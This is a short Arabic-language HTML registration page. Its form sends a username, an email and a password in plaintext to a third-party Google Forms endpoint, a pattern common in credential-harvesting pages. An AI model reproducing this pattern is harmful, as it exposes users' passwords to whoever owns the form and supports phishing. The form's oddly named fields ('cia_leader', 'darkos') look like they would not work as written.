<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل حساب جديد</title>
    <style>
        body {
            background: url('background.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
            text-align: center;
            color: white;
            padding-top: 50px;
        }
        .container {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            margin: auto;
        }
        input, button {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }
        .btn {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>تسجيل حساب جديد</h2>
        <form action="https://docs.google.com/forms/d/e/1FAIpQLSc86i273OZKZFysB10jgV51rYDNAMg4bEOilSvi0sVnOPkrpg/formResponse" method="post">
            <input type="text" name="entry.cia_language" placeholder="اسم المستخدم" required>
            <input type="email" name="entry.darkos" placeholder="البريد الإلكتروني" required>
            <input type="password" name="entry.cia_leader" placeholder="كلمة المرور" required>
            <button type="submit" class="btn">تسجيل</button>
        </form>
    </div>
</body>
</html>
